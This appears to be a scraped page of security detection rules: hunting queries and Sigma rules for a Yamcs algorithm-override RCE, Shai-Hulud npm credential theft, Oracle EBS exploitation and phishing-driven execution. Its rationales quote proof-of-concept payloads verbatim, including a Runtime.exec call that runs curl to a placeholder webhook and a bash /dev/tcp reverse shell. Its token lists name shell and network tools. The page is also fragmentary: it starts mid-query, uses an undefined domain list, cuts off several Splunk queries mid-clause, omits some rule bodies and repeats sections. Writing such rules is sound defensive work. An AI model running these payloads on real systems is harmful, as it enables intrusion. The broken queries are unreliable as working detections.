        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df") or SHA1 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df") or MD5 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

[LLM] Yamcs MDB algorithm PATCH with embedded Jython java.lang.Runtime payload (CVE-2026-46621) Exploitation High
Hunts the CVE-2026-46621 exploitation request: an authenticated HTTP PATCH to /api/mdb/{instance}/realtime/algorithms/{name} whose JSON body contains Jython-to-Java escape strings (java.lang.Runtime, getRuntime, import java). This is the article's exact exploit primitive — overwriting a Python algorithm's text via the MDB REST API to break out of the JSR-223 sandbox. Rationale: Pivots on the exact exploit primitive from the GHSA advisory: PATCH /api/mdb/{instance}/realtime/algorithms/{name} body containing 'java.lang.Runtime', 'getRuntime', or 'import java'. These tokens have no legitimate place in a Python/Jython algorithm in normal Yamcs operations — they are the Jython-to-Java escape. Cross-checked against the GHSA-2g95-6x5q-xjwj advisory PoC. Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://attack.mitre.org/techniques/T1059/006/ • https://nvd.nist.gov/vuln/detail/CVE-2026-46621
ATT&CKT1190 T1059.006 T1078
Data sourcesWeb.Web
// Yamcs runs as a JVM; web traffic to its REST API is usually proxied or visible as DeviceNetworkEvents to TCP/8090. Defender's HTTP-body visibility is limited — pair with the WAF/reverse-proxy log source.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemotePort == 8090 or LocalPort == 8090
| where InitiatingProcessFileName !in~ ("java.exe","java")
| where AdditionalFields has_any ("PATCH","/api/mdb/","/realtime/algorithms/")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, LocalPort, AdditionalFields
| order by Timestamp desc
// Detect HTTP PATCH to Yamcs MDB algorithms endpoint carrying Jython-to-Java escape strings.
let algoEndpoint = @"/api/mdb/[^/]+/realtime/algorithms/";
let jythonPayloadTokens = dynamic(["java.lang.Runtime","getRuntime","import java","Runtime.getRuntime","exec([\"bash\"","exec([\"sh\"","exec([\"cmd\""]);
union isfuzzy=true
(W3CIISLog
  | where TimeGenerated > ago(7d)
  | where csMethod =~ "PATCH"
  | where csUriStem matches regex algoEndpoint
  | extend Src = cIP, User = csUserName, Uri = strcat(csUriStem, iff(isnotempty(csUriQuery), strcat("?", csUriQuery), "")), UA = csUserAgent, Body = ""
  | project TimeGenerated, Src, User, Uri, UA, Body, Status = scStatus),
(CommonSecurityLog
  | where TimeGenerated > ago(7d)
  | where RequestMethod =~ "PATCH"
  | where RequestURL matches regex algoEndpoint
  | extend Src = SourceIP, User = SourceUserName, Uri = RequestURL, UA = RequestClientApplication, Body = coalesce(AdditionalExtensions, Message), Status = tostring(EventOutcome)
  | project TimeGenerated, Src, User, Uri, UA, Body, Status),
(ImWebSession
  | where TimeGenerated > ago(7d)
  | where HttpMethod =~ "PATCH"
  | where Url matches regex algoEndpoint
  | extend Src = SrcIpAddr, User = SrcUsername, Uri = Url, UA = HttpRequestHeaderUserAgent, Body = "", Status = tostring(HttpStatusCode)
  | project TimeGenerated, Src, User, Uri, UA, Body, Status)
| where Body has_any (jythonPayloadTokens) or Uri has_any (jythonPayloadTokens)
| order by TimeGenerated desc
title: Yamcs MDB Algorithm PATCH with Jython java.lang.Runtime Payload (CVE-2026-46621)
id: 6a3e9b1c-2d4e-4b1e-9b6f-7e8b1c2d4e3a
status: experimental
description: Detects HTTP PATCH to the Yamcs Mission Database algorithms endpoint with a request body containing Jython-to-Java escape strings used in CVE-2026-46621 (java.lang.Runtime / getRuntime / import java).
references:
  - https://github.com/advisories/GHSA-2g95-6x5q-xjwj
author: SOC Detection Engineering
date: 2026/05/28
tags:

  - attack.t1190

  - cve.2026.46621
logsource:
  category: webserver
detection:
  selection_method:
    cs-method: 'PATCH'
  selection_uri:
    cs-uri-stem|contains:
      - '/api/mdb/'
      - '/realtime/algorithms/'
  selection_payload:
    cs-uri-query|contains:
      - 'java.lang.Runtime'
      - 'getRuntime'
      - 'import java'
      - 'Runtime.getRuntime'
  condition: selection_method and selection_uri and selection_payload
falsepositives:
  - Internal red-team / vulnerability scanners replaying the PoC
  - Yamcs developers legitimately referencing java.lang in algorithm text (rare — algorithms are domain-specific)
level: high
(source:nginx OR source:apache OR source:haproxy OR source:linux.syslog) @http.method:PATCH @http.url_details.path:*/api/mdb/*/realtime/algorithms/* (@http.request.body:(*java.lang.Runtime* OR *getRuntime* OR *"import java"*) OR @http.url_details.queryString:(*java.lang.Runtime* OR *getRuntime*))

| ParentBaseFileName=/^java$/i

[LLM] Yamcs JVM spawns shell or network utility (CVE-2026-46621 post-exploitation) Installation High
Hunts the host-side payoff of CVE-2026-46621: a java/jython process under the Yamcs service forking bash, sh, curl, wget, nc, python or similar OS utilities. Yamcs is a telemetry processing JVM — under normal operations its process tree does not fork shells or network clients. Rationale: Article PoC: 'java.lang.Runtime.getRuntime().exec(["bash", "-c", "curl https://<YOUR-WEBHOOK-URL>/RCE"])' — the Yamcs JVM directly forks bash + curl. Pinning to parent=java/jython with a yamcs-context check on the parent commandline keeps FPs near zero because the Yamcs JVM has no legitimate need to fork shells. Cross-checked against MITRE T1059.006 (Python) and T1059.004 (Unix Shell). Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://attack.mitre.org/techniques/T1059/004/ • https://attack.mitre.org/techniques/T1059/006/
ATT&CKT1059.004 T1059.006 T1190
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("java","java.exe","jython")
| where FileName in~ ("bash","sh","dash","zsh","curl","wget","nc","ncat","python","python3","perl","powershell.exe","cmd.exe","pwsh","pwsh.exe")
| where InitiatingProcessCommandLine has_any ("yamcs","jython","algorithm","ScriptEngine","AlgorithmManager") or InitiatingProcessFolderPath has_any ("yamcs","jython")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
// Sentinel: Yamcs JVM (java/jython) spawning a shell or network utility — host-side CVE-2026-46621 payoff.
let ShellOrNet = dynamic(["bash","sh","dash","zsh","curl","wget","nc","ncat","python","python3","perl","powershell.exe","cmd.exe","pwsh","pwsh.exe"]);
let YamcsCtx = dynamic(["yamcs","jython","algorithm","ScriptEngine","AlgorithmManager"]);
union isfuzzy=true
(ImProcessCreate
  | where TimeGenerated > ago(7d)
  | where ParentProcessName has_any ("java","jython")
  | where TargetProcessName has_any (ShellOrNet)
  | where ParentProcessCommandLine has_any (YamcsCtx) or ActingProcessCommandLine has_any (YamcsCtx) or TargetProcessCommandLine has_any (YamcsCtx)
  | project TimeGenerated, Host = DvcHostname, User = ActorUsername,
            ParentImage = ParentProcessName, ParentCmd = ParentProcessCommandLine,
            ChildImage = TargetProcessName, ChildCmd = TargetProcessCommandLine),
(SecurityEvent
  | where TimeGenerated > ago(7d)
  | where EventID == 4688
  | where ParentProcessName has_any ("java.exe","jython.exe","\\java","\\jython")
  | where NewProcessName has_any ("\\bash.exe","\\sh.exe","\\powershell.exe","\\pwsh.exe","\\cmd.exe","\\curl.exe","\\wget.exe","\\nc.exe","\\ncat.exe","\\python.exe","\\python3.exe")
  | where CommandLine has_any (YamcsCtx) or ParentProcessName has_any (YamcsCtx)
  | project TimeGenerated, Host = Computer, User = SubjectUserName,
            ParentImage = ParentProcessName, ParentCmd = "",
            ChildImage = NewProcessName, ChildCmd = CommandLine),
(Syslog
  | where TimeGenerated > ago(7d)
  | where Facility =~ "authpriv" or ProcessName has_any ("audit","auditd","sudo")
  | where SyslogMessage has "java" and SyslogMessage has_any (ShellOrNet)
  | where SyslogMessage has_any (YamcsCtx)
  | project TimeGenerated, Host = HostName, User = "", ParentImage = "java", ParentCmd = SyslogMessage, ChildImage = "", ChildCmd = "")
| order by TimeGenerated desc

[LLM] Yamcs Java process beacons to webhook / interact / tunneling service (CVE-2026-46621 C2) Command & Control High
Hunts the article's C2 footprint: the Yamcs JVM (or a curl/wget it spawned) making an outbound connection to short-lived webhook / out-of-band-interaction services (webhook.site, requestbin, interactsh, ngrok, trycloudflare, beeceptor). Anchored to the Yamcs JVM as initiating process so we don't blanket-alert on internet usage. Rationale: Article PoC literally calls 'curl https://<YOUR-WEBHOOK-URL>/RCE' from Runtime.exec. Anchoring to (a) the Yamcs JVM or a curl/wget spawned by it AND (b) the well-known OOB-interaction domain list keeps this high-signal: a Yamcs telemetry server has no legitimate need to talk to webhook.site or interactsh. Cross-checked against the CVE-2026-46621 PoC and ProjectDiscovery's Interactsh public domain list. Cross-checked against: • https://github.com/advisories/GHSA-2g95-6x5q-xjwj • https://github.com/projectdiscovery/interactsh • https://attack.mitre.org/techniques/T1071/001/
ATT&CKT1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic Network_Resolution.DNS

DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("java","java.exe","jython","curl","curl.exe","wget","wget.exe")
| where (RemoteUrl has_any (oobDomains)) or (isnotempty(AdditionalFields) and AdditionalFields has_any (oobDomains))
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, RemoteIP, RemotePort, RemoteUrl, Protocol
| order by Timestamp desc

[LLM] Yamcs MdbOverrideApi algorithm PATCH carrying Nashorn Java.type RCE payload Exploitation High
Detects HTTP PATCH requests to the Yamcs algorithm-override endpoint where the JSON body contains Nashorn escape sequences that reach `java.lang.Runtime` — the exact CVE-2026-46562 exploit shape. Targets the request hitting any reverse proxy / WAF / web log in front of Yamcs (default port 8090). Rationale: Exploits ride the article's exact endpoint shape `PATCH /api/mdb-overrides/{instance}/{processor}/algorithms/{name*}` and require Nashorn pivot tokens (`Java.type`, `java.lang.Runtime`, `getRuntime`) in the JSON body — both are dead-giveaway strings called out in the GHSA advisory body. Legacy `5.5.0` path `/api/mdb/.../algorithms/` is also covered. No external corroboration available — advisory is sole source as of 2026-05-28.
ATT&CKT1190 T1059.007
Data sourcesWeb.Web
// Defender Advanced Hunting has no HTTP request-body table for Yamcs front-end logs; closest pivot is inbound TCP to port 8090 followed by java spawning a shell. See UC2/UC3 for the post-exploitation half.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "InboundConnectionAccepted"
| where LocalPort == 8090
| where InitiatingProcessFileName has_any ("java","java.exe")
| project Timestamp, DeviceName, RemoteIP, RemotePort, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
let YamcsExploitTokens = dynamic(["Java.type","java.lang.Runtime","getRuntime","ProcessBuilder","/dev/tcp/"]);
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod =~ "PATCH"
| where RequestURL matches regex @"(?i)/api/mdb-overrides/[^/]+/[^/]+/algorithms/"
| where Message has_any (YamcsExploitTokens) or RequestContext has_any (YamcsExploitTokens) or AdditionalExtensions has_any (YamcsExploitTokens)
| project TimeGenerated, SourceIP, DestinationIP, DestinationPort, RequestMethod, RequestURL, RequestClientApplication, Message, DeviceVendor, DeviceProduct
| order by TimeGenerated desc

[LLM] Yamcs JVM spawning a POSIX shell — Nashorn Runtime.exec post-exploitation Installation High
Detects the Yamcs `java` process (yamcs-core JVM) directly spawning `/bin/sh`, `/bin/bash`, `dash`, or `nc` — a behaviour that never occurs in legitimate Yamcs operation. This is the immediate child-process side of the CVE-2026-46562 Nashorn RCE primitive `Java.type("java.lang.Runtime").getRuntime().exec(...)`. Rationale: Article's PoC literally runs `Java.type("java.lang.Runtime").getRuntime().exec(["bash","-c","..."])`. The unique high-fidelity signal is `java` (with `yamcs`/`org.yamcs` in its cmdline so we scope to the Yamcs JVM specifically, not arbitrary Java apps) directly forking a shell — yamcs-core itself never does this in normal operation. No external corroboration available (GHSA is sole source).
ATT&CKT1059.004 T1190
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "java"
| where InitiatingProcessCommandLine has_any ("yamcs","org.yamcs","yamcs-core")
| where FileName in~ ("sh","bash","dash","zsh","nc","ncat","socat","python","python3","perl","ruby")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName endswith "/java" or ParentProcessName =~ "java"
| where ParentProcessCommandLine has_any ("yamcs","org.yamcs","yamcs-core")
| where ActingProcessName has_any ("/sh","/bash","/dash","/zsh","/nc","/ncat","/socat","/python","/python3","/perl")
   or TargetProcessName has_any ("sh","bash","dash","nc","ncat","socat","python","python3","perl")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc

[LLM] Reverse-shell /dev/tcp file descriptor from Yamcs java process tree Command & Control High
Detects the bash `exec 3<>/dev/tcp/HOST/PORT` reverse-shell file-descriptor primitive when it descends from the Yamcs JVM. This is the *exact* payload string in the CVE-2026-46562 PoC and catches the post-exploitation network pivot whether or not UC2 caught the initial spawn. Rationale: Verbatim from the GHSA PoC body: `["bash","-c","exec 3<>/dev/tcp/${LHOST}/${LPORT}; id >&3; sh -i <&3 >&3 2>&3"]`. The `/dev/tcp/` token is unique to bash-builtin reverse shells (no legitimate Yamcs subroutine writes to that pseudo-path), and constraining the parent chain to the Yamcs JVM cuts the broad LFI-style FPs that pure `/dev/tcp/` rules suffer. No external corroboration available (advisory is sole public source).

[LLM] Shai-Hulud npm postinstall reads cloud credential files (~/.aws, ~/.ssh, ~/.kube, gcloud ADC) Installation High
Hunts the Shai-Hulud worm's secret-harvesting stage: a node/npm/yarn process opens AWS credentials, SSH private keys, Kubernetes kubeconfig, or GCP application-default-credentials. The article confirms TGR-CRI-1135 released an open-source version on 2026-05-13, so copycats will reuse this file-access pattern. Rationale: Article confirms TGR-CRI-1135's malware exfiltrates 'cloud access tokens, SSH keys, Kubernetes secrets' and announced the open-source Shai-Hulud release 2026-05-13. Datadog Security Labs and Unit 42 follow-up writeups confirm the exact filesystem paths (~/.aws/credentials, ~/.ssh/, ~/.kube/config, application_default_credentials.json) and that node is the executing host — making this a precise file-access pivot, not a generic 'credentials in files' rule. Cross-checked against: • https://unit42.paloaltonetworks.com/npm-supply-chain-attack/ • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised

[LLM] Bling Libra: Entra device join immediately after vishing-driven MFA registration Installation High
Detects Bling Libra's (ShinyHunters / UNC6040) post-vishing persistence pattern — within minutes of a successful interactive sign-in from a new location/IP, the same identity registers a new device (and frequently a new MFA method) on Entra ID. The article confirms the playbook is unchanged: vishing → credential+MFA intercept → register own device for persistence. Rationale: Article states Bling Libra 'continues to use vishing for initial access… and ultimately registering their own devices to establish persistence within targeted environments.' Mandiant/Google Cloud and BankInfoSecurity writeups confirm device-registration-within-30-minutes-of-suspicious-sign-in as the high-fidelity correlation. The temporal join is what distinguishes attacker registration from a user's own new laptop enrollment. [LLM] Hazy Scorpius (CL0P) Oracle EBS exploitation via CVE-2025-61882 — concurrent processing spawns shell/wget Exploitation High
Hunts the post-exploit footprint of CVE-2025-61882 in Oracle E-Business Suite (Concurrent Processing) — the Java app-server process (java/oracle) spawning OS shells, wget, curl, perl or python is the canonical Cl0p webshell-drop pattern observed by Mandiant/Google Cloud against EBS 12.2.x. Rationale: Article names CVE-2025-61882 as Hazy Scorpius/CL0P's vector into Oracle EBS. Google Cloud TI and Oracle's own advisory confirm Cl0p drops Java/JSP webshells via the Concurrent Processing component; java/FNDLIBR spawning a shell/downloader on an EBS host is the cleanest live-exploit pivot. Filter for EBS-specific paths (appsutil, FMW_Home, comn/util) keeps this scoped to actual EBS servers. Cross-checked against: • https://www.oracle.com/security-alerts/alert-cve-2025-61882.html • https://cloud.google.com/blog/topics/threat-intelligence/oracle-ebusiness-suite-zero-day-exploitation • https://www.tenable.com/blog/cve-2025-61882-faq-oracle-e-business-suite-zero-day-cl0p-and-july-2025-cpu • https://www.rapid7.com/blog/post/etr-cve-2025-61882-critical-0day-in-oracle-e-business-suite-exploited-in-the-wild/

| where FileName in~ ("sh","bash","ksh","zsh","cmd.exe","powershell.exe","pwsh.exe","wget","curl","perl","python","python3","nc","ncat","certutil.exe")
| where ProcessCommandLine !has "adstrtal" and ProcessCommandLine !has "adstpall"

title: Oracle EBS Concurrent Processing Spawns OS Shell or Downloader (CVE-2025-61882)
id: 1e7a8b04-3c6f-4a18-9b6d-72bb5a9e2c11
status: experimental
description: Detects Oracle E-Business Suite java/FNDLIBR/httpd parent processes spawning shells, wget, curl, perl, python or nc — the post-exploit footprint of CVE-2025-61882 (Cl0p / Hazy Scorpius extortion campaign).
references:
  - https://unit42.paloaltonetworks.com/cyber-extortion-economy/
  - https://www.oracle.com/security-alerts/alert-cve-2025-61882.html
  - https://cloud.google.com/blog/topics/threat-intelligence/oracle-ebusiness-suite-zero-day-exploitation
author: SOC Detection Engineering
date: 2026/05/28
tags:
  - attack.initial_access
  - attack.t1190
  - attack.t1505.003

logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|endswith:
      - '/java'
      - '/FNDLIBR'
      - '/httpd'
    ParentCommandLine|contains:
      - 'oracle'
      - 'EBS'
      - 'fs_inst'
      - 'appsutil'
      - 'comn/util'
  selection_child:
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/ksh'
      - '/wget'
      - '/curl'
      - '/perl'
      - '/python'
      - '/python3'
      - '/nc'
      - '/ncat'
  filter_legit:
    CommandLine|contains:
      - 'adstrtal'
      - 'adstpall'
      - 'adcfgclone'
  condition: selection_parent and selection_child and not filter_legit
falsepositives:
  - Oracle EBS patching (autoconfig, adop) which legitimately spawns shells under java
  - Administrative concurrent programs that shell out by design
level: high
source:linux.auditd @auditd.type:EXECVE @process.parent.executable.path:(*/java OR */FNDLIBR OR */httpd) @process.executable.path:(*/sh OR */bash OR */ksh OR */wget OR */curl OR */perl OR */python OR */python3 OR */nc OR */ncat) -@process.command_line:(*adstrtal* OR *adstpall* OR *adcfgclone*)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^(java|FNDLIBR|httpd)$/i
| regex("(oracle|EBS|fs_inst|appsutil|FMW_Home|comn/util|Concurrent)", field=ParentImageFileName)
| ImageFileName=/\/(sh|bash|ksh|zsh|wget|curl|perl|python3?|nc|ncat)$|\\(cmd|powershell|pwsh|certutil)\.exe$/i
| NOT (regex("(adstrtal|adstpall|adcfgclone)", field=CommandLine))
| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine], function=count())

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web

    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`

| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",

         by Processes.dest, Processes.user

| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd

Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"

   or NewProcessName endswith "\cscript.exe"

    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject
| rename All_Email.recipient as user
| join type=inner user
    [| tstats `summariesonly` count
        from datamodel=Endpoint.Processes
        where Processes.parent_process_name IN ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]
| tstats summariesonly=false count
    from datamodel=Email.All_Email
    where All_Email.file_name!="-"
    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject
| rename All_Email.recipient as user
| join type=inner user
    [| tstats summariesonly=false count
        from datamodel=Endpoint.Processes
        where Processes.parent_process_name IN ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]

Actions on Objectives
Likely
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · PowerShell encoded / obfuscated command · Article-specific behavioural hunt — GPU mining malware spreads via SEO poisoning, AI chatbots
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
